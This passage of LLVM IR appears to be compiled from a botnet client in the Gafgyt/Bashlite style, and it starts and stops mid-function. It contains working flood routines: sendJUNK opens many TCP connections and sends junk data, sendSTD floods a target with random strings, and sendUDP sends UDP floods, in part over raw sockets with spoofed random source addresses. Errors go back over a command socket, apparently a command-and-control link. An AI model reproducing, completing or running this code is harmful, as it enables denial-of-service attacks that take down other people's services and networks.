  %242 = sext i32 %241 to i64
  %243 = getelementptr inbounds %struct.state_t, %struct.state_t* %41, i64 %242
  %244 = getelementptr inbounds %struct.state_t, %struct.state_t* %243, i32 0, i32 0
  %245 = load i32, i32* %244, align 8
  %246 = add nsw i32 %245, 1
  %247 = call i32 @select(i32 %246, %struct.fd_set* null, %struct.fd_set* null, %struct.fd_set* %12, %struct.timeval* %13)
  store i32 %247, i32* %16, align 4
  %248 = load i32, i32* %16, align 4
  %249 = icmp ne i32 %248, 0
  br i1 %249, label %250, label %261

250:                                              ; preds = %219
  %251 = load i32, i32* %8, align 4
  %252 = sext i32 %251 to i64
  %253 = getelementptr inbounds %struct.state_t, %struct.state_t* %41, i64 %252
  %254 = getelementptr inbounds %struct.state_t, %struct.state_t* %253, i32 0, i32 0
  %255 = load i32, i32* %254, align 8
  %256 = call i32 @close(i32 %255)
  %257 = load i32, i32* %8, align 4
  %258 = sext i32 %257 to i64
  %259 = getelementptr inbounds %struct.state_t, %struct.state_t* %41, i64 %258
  %260 = getelementptr inbounds %struct.state_t, %struct.state_t* %259, i32 0, i32 1
  store i8 0, i8* %260, align 4
  br label %261

261:                                              ; preds = %250, %219
  br label %262

262:                                              ; preds = %60, %261, %201, %110
  br label %263

263:                                              ; preds = %262
  %264 = load i32, i32* %8, align 4
  %265 = add nsw i32 %264, 1
  store i32 %265, i32* %8, align 4
  br label %56, !llvm.loop !29

266:                                              ; preds = %56
  br label %51, !llvm.loop !30

267:                                              ; preds = %51
  %268 = load i8*, i8** %10, align 8
  call void @llvm.stackrestore(i8* %268)
  br label %269

269:                                              ; preds = %267, %34
  ret void
}

; Function Attrs: nofree nosync nounwind willreturn
declare i8* @llvm.stacksave() #2

declare i32 @time(...) #5

; Function Attrs: nofree nosync nounwind willreturn
declare void @llvm.stackrestore(i8*) #2

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local void @sendJUNK(i8* %0, i32 %1, i32 %2) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca %struct.sockaddr_in, align 4
  %10 = alloca i8*, align 8
  %11 = alloca i64, align 8
  %12 = alloca %struct.fd_set, align 8
  %13 = alloca %struct.timeval, align 8
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca i8*, align 8
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca %struct.fd_set*, align 8
  store i8* %0, i8** %4, align 8
  store i32 %1, i32* %5, align 4
  store i32 %2, i32* %6, align 4
  %21 = call i32 @getdtablesize() #12
  %22 = sdiv i32 %21, 2
  store i32 %22, i32* %7, align 4
  %23 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 0
  store i16 2, i16* %23, align 4
  %24 = load i32, i32* %5, align 4
  %25 = trunc i32 %24 to i16
  %26 = call zeroext i16 @htons(i16 zeroext %25) #15
  %27 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 1
  store i16 %26, i16* %27, align 2
  %28 = load i8*, i8** %4, align 8
  %29 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 2
  %30 = call i32 @getHost(i8* %28, %struct.in_addr* %29)
  %31 = icmp ne i32 %30, 0
  br i1 %31, label %32, label %33

32:                                               ; preds = %3
  br label %233

33:                                               ; preds = %3
  %34 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 3
  %35 = getelementptr inbounds [8 x i8], [8 x i8]* %34, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 4 %35, i8 0, i64 8, i1 false)
  %36 = load i32, i32* %7, align 4
  %37 = zext i32 %36 to i64
  %38 = call i8* @llvm.stacksave()
  store i8* %38, i8** %10, align 8
  %39 = alloca %struct.state_t.1, i64 %37, align 16
  store i64 %37, i64* %11, align 8
  %40 = bitcast %struct.state_t.1* %39 to i8*
  %41 = load i32, i32* %7, align 4
  %42 = sext i32 %41 to i64
  %43 = mul i64 %42, 5
  call void @llvm.memset.p0i8.i64(i8* align 16 %40, i8 0, i64 %43, i1 false)
  %44 = call noalias align 16 i8* @malloc(i64 1024) #12
  store i8* %44, i8** %17, align 8
  %45 = load i8*, i8** %17, align 8
  call void @llvm.memset.p0i8.i64(i8* align 1 %45, i8 0, i64 1024, i1 false)
  %46 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %47 = load i32, i32* %6, align 4
  %48 = add nsw i32 %46, %47
  store i32 %48, i32* %18, align 4
  br label %49

49:                                               ; preds = %230, %33
  %50 = load i32, i32* %18, align 4
  %51 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %52 = icmp sgt i32 %50, %51
  br i1 %52, label %53, label %231

53:                                               ; preds = %49
  store i32 0, i32* %8, align 4
  br label %54

54:                                               ; preds = %227, %53
  %55 = load i32, i32* %8, align 4
  %56 = load i32, i32* %7, align 4
  %57 = icmp slt i32 %55, %56
  br i1 %57, label %58, label %230

58:                                               ; preds = %54
  %59 = load i32, i32* %8, align 4
  %60 = sext i32 %59 to i64
  %61 = getelementptr inbounds %struct.state_t.1, %struct.state_t.1* %39, i64 %60
  %62 = getelementptr inbounds %struct.state_t.1, %struct.state_t.1* %61, i32 0, i32 1
  %63 = load i8, i8* %62, align 4
  %64 = zext i8 %63 to i32
  switch i32 %64, label %226 [
    i32 0, label %65
    i32 1, label %109
    i32 2, label %200
  ]

65:                                               ; preds = %58
  %66 = call i32 @socket(i32 2, i32 1, i32 0) #12
  %67 = load i32, i32* %8, align 4
  %68 = sext i32 %67 to i64
  %69 = getelementptr inbounds %struct.state_t.1, %struct.state_t.1* %39, i64 %68
  %70 = getelementptr inbounds %struct.state_t.1, %struct.state_t.1* %69, i32 0, i32 0
  store i32 %66, i32* %70, align 8
  %71 = load i32, i32* %8, align 4
  %72 = sext i32 %71 to i64
  %73 = getelementptr inbounds %struct.state_t.1, %struct.state_t.1* %39, i64 %72
  %74 = getelementptr inbounds %struct.state_t.1, %struct.state_t.1* %73, i32 0, i32 0
  %75 = load i32, i32* %74, align 8
  %76 = load i32, i32* %8, align 4
  %77 = sext i32 %76 to i64
  %78 = getelementptr inbounds %struct.state_t.1, %struct.state_t.1* %39, i64 %77
  %79 = getelementptr inbounds %struct.state_t.1, %struct.state_t.1* %78, i32 0, i32 0
  %80 = load i32, i32* %79, align 8
  %81 = call i32 (i32, i32, ...) @fcntl(i32 %80, i32 3, i8* null)
  %82 = or i32 %81, 2048
  %83 = call i32 (i32, i32, ...) @fcntl(i32 %75, i32 4, i32 %82)
  %84 = load i32, i32* %8, align 4
  %85 = sext i32 %84 to i64
  %86 = getelementptr inbounds %struct.state_t.1, %struct.state_t.1* %39, i64 %85
  %87 = getelementptr inbounds %struct.state_t.1, %struct.state_t.1* %86, i32 0, i32 0
  %88 = load i32, i32* %87, align 8
  %89 = bitcast %struct.sockaddr_in* %9 to %struct.sockaddr*
  %90 = call i32 @connect(i32 %88, %struct.sockaddr* %89, i32 16)
  %91 = icmp ne i32 %90, -1
  br i1 %91, label %96, label %92

92:                                               ; preds = %65
  %93 = call i32* @__errno_location() #15
  %94 = load i32, i32* %93, align 4
  %95 = icmp ne i32 %94, 115
  br i1 %95, label %96, label %103

96:                                               ; preds = %92, %65
  %97 = load i32, i32* %8, align 4
  %98 = sext i32 %97 to i64
  %99 = getelementptr inbounds %struct.state_t.1, %struct.state_t.1* %39, i64 %98
  %100 = getelementptr inbounds %struct.state_t.1, %struct.state_t.1* %99, i32 0, i32 0
  %101 = load i32, i32* %100, align 8
  %102 = call i32 @close(i32 %101)
  br label %108

103:                                              ; preds = %92
  %104 = load i32, i32* %8, align 4
  %105 = sext i32 %104 to i64
  %106 = getelementptr inbounds %struct.state_t.1, %struct.state_t.1* %39, i64 %105
  %107 = getelementptr inbounds %struct.state_t.1, %struct.state_t.1* %106, i32 0, i32 1
  store i8 1, i8* %107, align 4
  br label %108

108:                                              ; preds = %103, %96
  br label %226

109:                                              ; preds = %58
  br label %110

110:                                              ; preds = %109
  store %struct.fd_set* %12, %struct.fd_set** %20, align 8
  store i32 0, i32* %19, align 4
  br label %111

111:                                              ; preds = %121, %110
  %112 = load i32, i32* %19, align 4
  %113 = zext i32 %112 to i64
  %114 = icmp ult i64 %113, 16
  br i1 %114, label %115, label %124

115:                                              ; preds = %111
  %116 = load %struct.fd_set*, %struct.fd_set** %20, align 8
  %117 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %116, i32 0, i32 0
  %118 = load i32, i32* %19, align 4
  %119 = zext i32 %118 to i64
  %120 = getelementptr inbounds [16 x i64], [16 x i64]* %117, i64 0, i64 %119
  store i64 0, i64* %120, align 8
  br label %121

121:                                              ; preds = %115
  %122 = load i32, i32* %19, align 4
  %123 = add i32 %122, 1
  store i32 %123, i32* %19, align 4
  br label %111, !llvm.loop !31

124:                                              ; preds = %111
  br label %125

125:                                              ; preds = %124
  br label %126

126:                                              ; preds = %125
  %127 = load i32, i32* %8, align 4
  %128 = sext i32 %127 to i64
  %129 = getelementptr inbounds %struct.state_t.1, %struct.state_t.1* %39, i64 %128
  %130 = getelementptr inbounds %struct.state_t.1, %struct.state_t.1* %129, i32 0, i32 0
  %131 = load i32, i32* %130, align 8
  %132 = srem i32 %131, 64
  %133 = zext i32 %132 to i64
  %134 = shl i64 1, %133
  %135 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %12, i32 0, i32 0
  %136 = load i32, i32* %8, align 4
  %137 = sext i32 %136 to i64
  %138 = getelementptr inbounds %struct.state_t.1, %struct.state_t.1* %39, i64 %137
  %139 = getelementptr inbounds %struct.state_t.1, %struct.state_t.1* %138, i32 0, i32 0
  %140 = load i32, i32* %139, align 8
  %141 = sdiv i32 %140, 64
  %142 = sext i32 %141 to i64
  %143 = getelementptr inbounds [16 x i64], [16 x i64]* %135, i64 0, i64 %142
  %144 = load i64, i64* %143, align 8
  %145 = or i64 %144, %134
  store i64 %145, i64* %143, align 8
  %146 = getelementptr inbounds %struct.timeval, %struct.timeval* %13, i32 0, i32 0
  store i64 0, i64* %146, align 8
  %147 = getelementptr inbounds %struct.timeval, %struct.timeval* %13, i32 0, i32 1
  store i64 10000, i64* %147, align 8
  %148 = load i32, i32* %8, align 4
  %149 = sext i32 %148 to i64
  %150 = getelementptr inbounds %struct.state_t.1, %struct.state_t.1* %39, i64 %149
  %151 = getelementptr inbounds %struct.state_t.1, %struct.state_t.1* %150, i32 0, i32 0
  %152 = load i32, i32* %151, align 8
  %153 = add nsw i32 %152, 1
  %154 = call i32 @select(i32 %153, %struct.fd_set* null, %struct.fd_set* %12, %struct.fd_set* null, %struct.timeval* %13)
  store i32 %154, i32* %16, align 4
  %155 = load i32, i32* %16, align 4
  %156 = icmp eq i32 %155, 1
  br i1 %156, label %157, label %184

157:                                              ; preds = %126
  store i32 4, i32* %14, align 4
  %158 = load i32, i32* %8, align 4
  %159 = sext i32 %158 to i64
  %160 = getelementptr inbounds %struct.state_t.1, %struct.state_t.1* %39, i64 %159
  %161 = getelementptr inbounds %struct.state_t.1, %struct.state_t.1* %160, i32 0, i32 0
  %162 = load i32, i32* %161, align 8
  %163 = bitcast i32* %15 to i8*
  %164 = call i32 @getsockopt(i32 %162, i32 1, i32 4, i8* %163, i32* %14) #12
  %165 = load i32, i32* %15, align 4
  %166 = icmp ne i32 %165, 0
  br i1 %166, label %167, label %178

167:                                              ; preds = %157
  %168 = load i32, i32* %8, align 4
  %169 = sext i32 %168 to i64
  %170 = getelementptr inbounds %struct.state_t.1, %struct.state_t.1* %39, i64 %169
  %171 = getelementptr inbounds %struct.state_t.1, %struct.state_t.1* %170, i32 0, i32 0
  %172 = load i32, i32* %171, align 8
  %173 = call i32 @close(i32 %172)
  %174 = load i32, i32* %8, align 4
  %175 = sext i32 %174 to i64
  %176 = getelementptr inbounds %struct.state_t.1, %struct.state_t.1* %39, i64 %175
  %177 = getelementptr inbounds %struct.state_t.1, %struct.state_t.1* %176, i32 0, i32 1
  store i8 0, i8* %177, align 4
  br label %183

178:                                              ; preds = %157
  %179 = load i32, i32* %8, align 4
  %180 = sext i32 %179 to i64
  %181 = getelementptr inbounds %struct.state_t.1, %struct.state_t.1* %39, i64 %180
  %182 = getelementptr inbounds %struct.state_t.1, %struct.state_t.1* %181, i32 0, i32 1
  store i8 2, i8* %182, align 4
  br label %183

183:                                              ; preds = %178, %167
  br label %199

184:                                              ; preds = %126
  %185 = load i32, i32* %16, align 4
  %186 = icmp eq i32 %185, -1
  br i1 %186, label %187, label %198

187:                                              ; preds = %184
  %188 = load i32, i32* %8, align 4
  %189 = sext i32 %188 to i64
  %190 = getelementptr inbounds %struct.state_t.1, %struct.state_t.1* %39, i64 %189
  %191 = getelementptr inbounds %struct.state_t.1, %struct.state_t.1* %190, i32 0, i32 0
  %192 = load i32, i32* %191, align 8
  %193 = call i32 @close(i32 %192)
  %194 = load i32, i32* %8, align 4
  %195 = sext i32 %194 to i64
  %196 = getelementptr inbounds %struct.state_t.1, %struct.state_t.1* %39, i64 %195
  %197 = getelementptr inbounds %struct.state_t.1, %struct.state_t.1* %196, i32 0, i32 1
  store i8 0, i8* %197, align 4
  br label %198

198:                                              ; preds = %187, %184
  br label %199

199:                                              ; preds = %198, %183
  br label %226

200:                                              ; preds = %58
  %201 = load i8*, i8** %17, align 8
  call void @makeRandomStr(i8* %201, i32 1024)
  %202 = load i32, i32* %8, align 4
  %203 = sext i32 %202 to i64
  %204 = getelementptr inbounds %struct.state_t.1, %struct.state_t.1* %39, i64 %203
  %205 = getelementptr inbounds %struct.state_t.1, %struct.state_t.1* %204, i32 0, i32 0
  %206 = load i32, i32* %205, align 8
  %207 = load i8*, i8** %17, align 8
  %208 = call i64 @send(i32 %206, i8* %207, i64 1024, i32 16384)
  %209 = icmp eq i64 %208, -1
  br i1 %209, label %210, label %225

210:                                              ; preds = %200
  %211 = call i32* @__errno_location() #15
  %212 = load i32, i32* %211, align 4
  %213 = icmp ne i32 %212, 11
  br i1 %213, label %214, label %225

214:                                              ; preds = %210
  %215 = load i32, i32* %8, align 4
  %216 = sext i32 %215 to i64
  %217 = getelementptr inbounds %struct.state_t.1, %struct.state_t.1* %39, i64 %216
  %218 = getelementptr inbounds %struct.state_t.1, %struct.state_t.1* %217, i32 0, i32 0
  %219 = load i32, i32* %218, align 8
  %220 = call i32 @close(i32 %219)
  %221 = load i32, i32* %8, align 4
  %222 = sext i32 %221 to i64
  %223 = getelementptr inbounds %struct.state_t.1, %struct.state_t.1* %39, i64 %222
  %224 = getelementptr inbounds %struct.state_t.1, %struct.state_t.1* %223, i32 0, i32 1
  store i8 0, i8* %224, align 4
  br label %225

225:                                              ; preds = %214, %210, %200
  br label %226

226:                                              ; preds = %58, %225, %199, %108
  br label %227

227:                                              ; preds = %226
  %228 = load i32, i32* %8, align 4
  %229 = add nsw i32 %228, 1
  store i32 %229, i32* %8, align 4
  br label %54, !llvm.loop !32

230:                                              ; preds = %54
  br label %49, !llvm.loop !33

231:                                              ; preds = %49
  %232 = load i8*, i8** %10, align 8
  call void @llvm.stackrestore(i8* %232)
  br label %233

233:                                              ; preds = %231, %32
  ret void
}

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local void @sendSTD(i8* %0, i32 %1, i32 %2) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i64, align 8
  %10 = alloca %struct.sockaddr_in, align 4
  %11 = alloca %struct.hostent*, align 8
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca [36 x i8*], align 16
  %15 = alloca i8*, align 8
  store i8* %0, i8** %4, align 8
  store i32 %1, i32* %5, align 4
  store i32 %2, i32* %6, align 4
  %16 = call i32 @fork() #12
  store i32 %16, i32* %8, align 4
  %17 = load i32, i32* %8, align 4
  %18 = icmp sgt i32 %17, 0
  br i1 %18, label %22, label %19

19:                                               ; preds = %3
  %20 = load i32, i32* %8, align 4
  %21 = icmp slt i32 %20, 1
  br i1 %21, label %22, label %23

22:                                               ; preds = %19, %3
  ret void

23:                                               ; preds = %19
  %24 = call i32 @socket(i32 2, i32 2, i32 0) #12
  store i32 %24, i32* %7, align 4
  %25 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %26 = sext i32 %25 to i64
  store i64 %26, i64* %9, align 8
  %27 = load i8*, i8** %4, align 8
  %28 = call %struct.hostent* @gethostbyname(i8* %27)
  store %struct.hostent* %28, %struct.hostent** %11, align 8
  %29 = bitcast %struct.sockaddr_in* %10 to i8*
  call void @llvm.memset.p0i8.i64(i8* align 4 %29, i8 0, i64 16, i1 false)
  %30 = load %struct.hostent*, %struct.hostent** %11, align 8
  %31 = getelementptr inbounds %struct.hostent, %struct.hostent* %30, i32 0, i32 4
  %32 = load i8**, i8*** %31, align 8
  %33 = getelementptr inbounds i8*, i8** %32, i64 0
  %34 = load i8*, i8** %33, align 8
  %35 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 2
  %36 = bitcast %struct.in_addr* %35 to i8*
  %37 = load %struct.hostent*, %struct.hostent** %11, align 8
  %38 = getelementptr inbounds %struct.hostent, %struct.hostent* %37, i32 0, i32 3
  %39 = load i32, i32* %38, align 4
  %40 = sext i32 %39 to i64
  call void @bcopy(i8* %34, i8* %36, i64 %40) #12
  %41 = load %struct.hostent*, %struct.hostent** %11, align 8
  %42 = getelementptr inbounds %struct.hostent, %struct.hostent* %41, i32 0, i32 2
  %43 = load i32, i32* %42, align 8
  %44 = trunc i32 %43 to i16
  %45 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 0
  store i16 %44, i16* %45, align 4
  %46 = load i32, i32* %5, align 4
  %47 = trunc i32 %46 to i16
  %48 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 1
  store i16 %47, i16* %48, align 2
  store i32 0, i32* %12, align 4
  store i32 450, i32* %13, align 4
  br label %49

49:                                               ; preds = %23, %78
  %50 = bitcast [36 x i8*]* %14 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 16 %50, i8* align 16 bitcast ([36 x i8*]* @__const.sendSTD.randstrings to i8*), i64 288, i1 false)
  %51 = call i32 @rand() #12
  %52 = sext i32 %51 to i64
  %53 = urem i64 %52, 36
  %54 = getelementptr inbounds [36 x i8*], [36 x i8*]* %14, i64 0, i64 %53
  %55 = load i8*, i8** %54, align 8
  store i8* %55, i8** %15, align 8
  %56 = load i32, i32* %12, align 4
  %57 = icmp uge i32 %56, 50
  br i1 %57, label %58, label %78

58:                                               ; preds = %49
  %59 = load i32, i32* %7, align 4
  %60 = load i8*, i8** %15, align 8
  %61 = load i32, i32* %13, align 4
  %62 = sext i32 %61 to i64
  %63 = call i64 @send(i32 %59, i8* %60, i64 %62, i32 0)
  %64 = load i32, i32* %7, align 4
  %65 = bitcast %struct.sockaddr_in* %10 to %struct.sockaddr*
  %66 = call i32 @connect(i32 %64, %struct.sockaddr* %65, i32 16)
  %67 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %68 = sext i32 %67 to i64
  %69 = load i64, i64* %9, align 8
  %70 = load i32, i32* %6, align 4
  %71 = sext i32 %70 to i64
  %72 = add nsw i64 %69, %71
  %73 = icmp sge i64 %68, %72
  br i1 %73, label %74, label %77

74:                                               ; preds = %58
  %75 = load i32, i32* %7, align 4
  %76 = call i32 @close(i32 %75)
  call void @_exit(i32 0) #14
  unreachable

77:                                               ; preds = %58
  store i32 0, i32* %12, align 4
  br label %78

78:                                               ; preds = %77, %49
  %79 = load i32, i32* %12, align 4
  %80 = add i32 %79, 1
  store i32 %80, i32* %12, align 4
  br label %49
}

; Function Attrs: nounwind
declare i32 @rand() #3

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local void @sendUDP(i8* %0, i32 %1, i32 %2, i32 %3, i32 %4, i32 %5, i32 %6, i32 %7) #0 {
  %9 = alloca i8*, align 8
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca %struct.sockaddr_in, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i8*, align 8
  %21 = alloca i32, align 4
  %22 = alloca i32, align 4
  %23 = alloca i32, align 4
  %24 = alloca i32, align 4
  %25 = alloca i32, align 4
  %26 = alloca i32, align 4
  %27 = alloca i32, align 4
  %28 = alloca i8*, align 8
  %29 = alloca i64, align 8
  %30 = alloca %struct.iphdr*, align 8
  %31 = alloca %struct.udphdr*, align 8
  %32 = alloca i32, align 4
  %33 = alloca i32, align 4
  %34 = alloca i32, align 4
  store i8* %0, i8** %9, align 8
  store i32 %1, i32* %10, align 4
  store i32 %2, i32* %11, align 4
  store i32 %3, i32* %12, align 4
  store i32 %4, i32* %13, align 4
  store i32 %5, i32* %14, align 4
  store i32 %6, i32* %15, align 4
  store i32 %7, i32* %16, align 4
  %35 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %17, i32 0, i32 0
  store i16 2, i16* %35, align 4
  %36 = load i32, i32* %10, align 4
  %37 = icmp eq i32 %36, 0
  br i1 %37, label %38, label %42

38:                                               ; preds = %8
  %39 = call i32 @rand_cmwc()
  %40 = trunc i32 %39 to i16
  %41 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %17, i32 0, i32 1
  store i16 %40, i16* %41, align 2
  br label %47

42:                                               ; preds = %8
  %43 = load i32, i32* %10, align 4
  %44 = trunc i32 %43 to i16
  %45 = call zeroext i16 @htons(i16 zeroext %44) #15
  %46 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %17, i32 0, i32 1
  store i16 %45, i16* %46, align 2
  br label %47

47:                                               ; preds = %42, %38
  %48 = load i8*, i8** %9, align 8
  %49 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %17, i32 0, i32 2
  %50 = call i32 @getHost(i8* %48, %struct.in_addr* %49)
  %51 = icmp ne i32 %50, 0
  br i1 %51, label %52, label %53

52:                                               ; preds = %47
  br label %296

53:                                               ; preds = %47
  %54 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %17, i32 0, i32 3
  %55 = getelementptr inbounds [8 x i8], [8 x i8]* %54, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 4 %55, i8 0, i64 8, i1 false)
  %56 = load i32, i32* %14, align 4
  store i32 %56, i32* %18, align 4
  %57 = load i32, i32* %12, align 4
  %58 = icmp eq i32 %57, 32
  br i1 %58, label %59, label %121

59:                                               ; preds = %53
  %60 = call i32 @socket(i32 2, i32 2, i32 17) #12
  store i32 %60, i32* %19, align 4
  %61 = load i32, i32* %19, align 4
  %62 = icmp ne i32 %61, 0
  br i1 %62, label %66, label %63

63:                                               ; preds = %59
  %64 = load i32, i32* @mainCommSock, align 4
  %65 = call i32 (i32, i8*, ...) @sockprintf(i32 %64, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.73, i64 0, i64 0))
  br label %296

66:                                               ; preds = %59
  %67 = load i32, i32* %13, align 4
  %68 = add nsw i32 %67, 1
  %69 = sext i32 %68 to i64
  %70 = call noalias align 16 i8* @malloc(i64 %69) #12
  store i8* %70, i8** %20, align 8
  %71 = load i8*, i8** %20, align 8
  %72 = icmp eq i8* %71, null
  br i1 %72, label %73, label %74

73:                                               ; preds = %66
  br label %296

74:                                               ; preds = %66
  %75 = load i8*, i8** %20, align 8
  %76 = load i32, i32* %13, align 4
  %77 = add nsw i32 %76, 1
  %78 = sext i32 %77 to i64
  call void @llvm.memset.p0i8.i64(i8* align 1 %75, i8 0, i64 %78, i1 false)
  %79 = load i8*, i8** %20, align 8
  %80 = load i32, i32* %13, align 4
  call void @makeRandomStr(i8* %79, i32 %80)
  %81 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %82 = load i32, i32* %11, align 4
  %83 = add nsw i32 %81, %82
  store i32 %83, i32* %21, align 4
  store i32 0, i32* %22, align 4
  store i32 0, i32* %23, align 4
  br label %84

84:                                               ; preds = %74, %106, %113, %117
  %85 = load i32, i32* %19, align 4
  %86 = load i8*, i8** %20, align 8
  %87 = load i32, i32* %13, align 4
  %88 = sext i32 %87 to i64
  %89 = bitcast %struct.sockaddr_in* %17 to %struct.sockaddr*
  %90 = call i64 @sendto(i32 %85, i8* %86, i64 %88, i32 0, %struct.sockaddr* %89, i32 16)
  %91 = load i32, i32* %22, align 4
  %92 = load i32, i32* %18, align 4
  %93 = icmp eq i32 %91, %92
  br i1 %93, label %94, label %107

94:                                               ; preds = %84
  %95 = load i32, i32* %10, align 4
  %96 = icmp eq i32 %95, 0
  br i1 %96, label %97, label %101

97:                                               ; preds = %94
  %98 = call i32 @rand_cmwc()
  %99 = trunc i32 %98 to i16
  %100 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %17, i32 0, i32 1
  store i16 %99, i16* %100, align 2
  br label %101

101:                                              ; preds = %97, %94
  %102 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %103 = load i32, i32* %21, align 4
  %104 = icmp sgt i32 %102, %103
  br i1 %104, label %105, label %106

105:                                              ; preds = %101
  br label %120

106:                                              ; preds = %101
  store i32 0, i32* %22, align 4
  br label %84

107:                                              ; preds = %84
  %108 = load i32, i32* %22, align 4
  %109 = add i32 %108, 1
  store i32 %109, i32* %22, align 4
  %110 = load i32, i32* %23, align 4
  %111 = load i32, i32* %15, align 4
  %112 = icmp eq i32 %110, %111
  br i1 %112, label %113, label %117

113:                                              ; preds = %107
  %114 = load i32, i32* %16, align 4
  %115 = mul nsw i32 %114, 1000
  %116 = call i32 @usleep(i32 %115)
  store i32 0, i32* %23, align 4
  br label %84

117:                                              ; preds = %107
  %118 = load i32, i32* %23, align 4
  %119 = add i32 %118, 1
  store i32 %119, i32* %23, align 4
  br label %84

120:                                              ; preds = %105
  br label %296

121:                                              ; preds = %53
  %122 = call i32 @socket(i32 2, i32 3, i32 17) #12
  store i32 %122, i32* %24, align 4
  %123 = load i32, i32* %24, align 4
  %124 = icmp ne i32 %123, 0
  br i1 %124, label %128, label %125

125:                                              ; preds = %121
  %126 = load i32, i32* @mainCommSock, align 4
  %127 = call i32 (i32, i8*, ...) @sockprintf(i32 %126, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.73, i64 0, i64 0))
  br label %296

128:                                              ; preds = %121
  store i32 1, i32* %25, align 4
  %129 = load i32, i32* %24, align 4
  %130 = bitcast i32* %25 to i8*
  %131 = call i32 @setsockopt(i32 %129, i32 0, i32 3, i8* %130, i32 4) #12
  %132 = icmp slt i32 %131, 0
  br i1 %132, label %133, label %136

133:                                              ; preds = %128
  %134 = load i32, i32* @mainCommSock, align 4
  %135 = call i32 (i32, i8*, ...) @sockprintf(i32 %134, i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.74, i64 0, i64 0))
  br label %296

136:                                              ; preds = %128
  store i32 50, i32* %26, align 4
  br label %137

137:                                              ; preds = %141, %136
  %138 = load i32, i32* %26, align 4
  %139 = add nsw i32 %138, -1
  store i32 %139, i32* %26, align 4
  %140 = icmp ne i32 %138, 0
  br i1 %140, label %141, label %146

141:                                              ; preds = %137
  %142 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %143 = call i32 @rand_cmwc()
  %144 = xor i32 %142, %143
  call void @srand(i32 %144) #12
  %145 = call i32 @rand() #12
  call void @init_rand(i32 %145)
  br label %137, !llvm.loop !34

146:                                              ; preds = %137
  %147 = load i32, i32* %12, align 4
  %148 = icmp eq i32 %147, 0
  br i1 %148, label %149, label %150

149:                                              ; preds = %146
  store i32 0, i32* %27, align 4
  br label %156

150:                                              ; preds = %146
  %151 = load i32, i32* %12, align 4
  %152 = sub nsw i32 32, %151
  %153 = shl i32 1, %152
  %154 = sub nsw i32 %153, 1
  %155 = xor i32 %154, -1
  store i32 %155, i32* %27, align 4
  br label %156

156:                                              ; preds = %150, %149
  %157 = load i32, i32* %13, align 4
  %158 = sext i32 %157 to i64
  %159 = add i64 28, %158
  %160 = call i8* @llvm.stacksave()
  store i8* %160, i8** %28, align 8
  %161 = alloca i8, i64 %159, align 16
  store i64 %159, i64* %29, align 8
  %162 = bitcast i8* %161 to %struct.iphdr*
  store %struct.iphdr* %162, %struct.iphdr** %30, align 8
  %163 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %164 = bitcast %struct.iphdr* %163 to i8*
  %165 = getelementptr i8, i8* %164, i64 20
  %166 = bitcast i8* %165 to %struct.udphdr*
  store %struct.udphdr* %166, %struct.udphdr** %31, align 8
  %167 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %168 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %17, i32 0, i32 2
  %169 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %168, i32 0, i32 0
  %170 = load i32, i32* %169, align 4
  %171 = load i32, i32* %27, align 4
  %172 = call i32 @GetRandomIP(i32 %171)
  %173 = call i32 @htonl(i32 %172) #15
  %174 = load i32, i32* %13, align 4
  %175 = sext i32 %174 to i64
  %176 = add i64 8, %175
